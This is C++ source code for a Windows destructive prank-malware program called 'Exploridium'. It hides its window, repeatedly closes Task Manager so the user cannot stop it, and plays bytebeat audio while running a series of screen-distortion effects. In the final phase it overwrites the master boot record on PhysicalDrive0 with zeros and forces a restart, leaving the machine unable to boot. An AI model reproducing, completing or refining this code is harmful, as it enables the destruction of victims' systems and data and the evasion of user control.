#include <windows.h>
#include <mmsystem.h>
#include <math.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")

unsigned int t = 0;
bool active = true;
const int PHASE_DURATION = 240000; 

// Overwrites the MBR (Sector 0) to prevent Windows from booting
void KillMBR() {
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (hDevice != INVALID_HANDLE_VALUE) {
        char buffer[512];
        ZeroMemory(buffer, 512);
        WriteFile(hDevice, buffer, 512, &dwBytesWritten, NULL);
        CloseHandle(hDevice);
    }
}

// Audio Engine with 16 synced phases
DWORD WINAPI AudioEngine(LPVOID lpParam) {
    HWAVEOUT hwo; 
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    WAVEHDR hdr[2]; char b[2][4000];
    for (int n = 0; n < 2; n++) { 
        ZeroMemory(&hdr[n], sizeof(WAVEHDR)); hdr[n].lpData = b[n]; hdr[n].dwBufferLength = 4000; 
    }
    int bi = 0;
    while (active) {
        int phase = (t / PHASE_DURATION) + 1;
        for (int i = 0; i < 4000; i++, t++) {
            // Generates rhythmic electronic sounds (Bytebeat)
            unsigned char s = (t * (t >> (phase % 8 + 5) | t >> (phase % 4 + 8))) & (t >> (phase % 3 + 7) | t >> 5);
            b[bi][i] = (char)s;
        }
        waveOutPrepareHeader(hwo, &hdr[bi], sizeof(WAVEHDR)); waveOutWrite(hwo, &hdr[bi], sizeof(WAVEHDR));
        while (!(hdr[bi].dwFlags & WHDR_DONE) && active) Sleep(1);
        waveOutUnprepareHeader(hwo, &hdr[bi], sizeof(WAVEHDR)); bi = (bi + 1) % 2;
    }
    waveOutReset(hwo); waveOutClose(hwo);
    return 0;
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)AudioEngine, 0, 0, 0);
    
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int rx = rand()%sw, ry = rand()%sh, rdx=20, rdy=20;

    while (active) {
        // Anti-Task Manager
        HWND tk = FindWindowA(NULL, "Task Manager");
        if (tk) PostMessage(tk, WM_CLOSE, 0, 0);

        int p = (t / PHASE_DURATION) + 1;

        // --- ALL PAYLOADS VERIFIED ---
        switch(p) {
            case 1: case 2: case 3: // Screen Shake & Inversion
                BitBlt(hdc, rand()%10-5, rand()%10-5, sw, sh, hdc, 0, 0, SRCINVERT);
                break;
            case 4: case 5: case 6: // Thermal Dots / Glitch (Photo 1)
                StretchBlt(hdc, rand()%5, rand()%5, sw-rand()%10, sh-rand()%10, hdc, 0, 0, sw, sh, SRCINVERT);
                break;
            case 7: case 8: case 9: // Bouncing RGB Circles (Photo 2)
                {
                    HBRUSH b = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
                    SelectObject(hdc, b);
                    rx+=rdx; ry+=rdy;
                    if(rx<=0 || rx+200>=sw) rdx=-rdx;
                    if(ry<=0 || ry+200>=sh) rdy=-rdy;
                    Ellipse(hdc, rx, ry, rx+200, ry+200);
                    DeleteObject(b);
                }
                break;
            case 10: case 11: // Cyan Polygons (Photo 3)
                {
                    POINT pts[3] = {{rand()%sw, rand()%sh}, {rand()%sw, rand()%sh}, {rand()%sw, rand()%sh}};
                    HBRUSH b = CreateSolidBrush(RGB(0, rand()%255, rand()%255));
                    SelectObject(hdc, b);
                    Polygon(hdc, pts, 3);
                    DeleteObject(b);
                }
                break;
            case 12: // Infinity Tunnel
                StretchBlt(hdc, 30, 30, sw-60, sh-60, hdc, 0, 0, sw, sh, SRCCOPY);
                break;
            case 16: // Final Phase: Kill the Disk
                KillMBR();
                BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
                break;
            default:
                BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, DSTINVERT);
                break;
        }

        ReleaseDC(0, hdc); hdc = GetDC(0);
        Sleep(10); // Faster execution for Destructive version
        if (t > PHASE_DURATION * 16) active = false;
    }
    
    // Final blow: Restart to show the dead OS
    system("shutdown /r /t 5 /c \"Exploridium has finished.\""); 
    return 0;
}